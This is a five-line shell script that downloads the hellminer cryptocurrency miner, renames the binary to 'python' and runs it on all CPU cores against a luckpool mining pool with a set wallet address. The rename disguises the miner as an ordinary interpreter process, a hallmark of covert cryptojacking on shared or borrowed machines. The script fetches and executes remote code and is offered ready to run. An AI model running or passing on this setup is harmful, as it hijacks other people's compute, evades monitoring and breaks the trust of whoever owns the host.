apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
tar -xhf hellminer_linux64.tar.gz
mv hellminer python
./python -c stratum+tcp://na.luckpool.net:3956 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.car -p x -t$(nproc --all)
